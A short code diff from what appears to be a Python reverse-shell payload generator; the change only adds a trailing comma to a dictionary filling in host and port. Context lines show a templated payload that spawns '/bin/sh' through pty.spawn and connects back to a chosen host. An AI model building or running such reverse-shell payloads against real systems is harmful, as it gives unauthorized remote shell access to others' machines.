@@ -55,7 +55,7 @@ pty.spawn("/bin/sh")
         
         """ % {
             "host": host,
-            "port": port
+            "port": port,
         }
 
         return payload_script
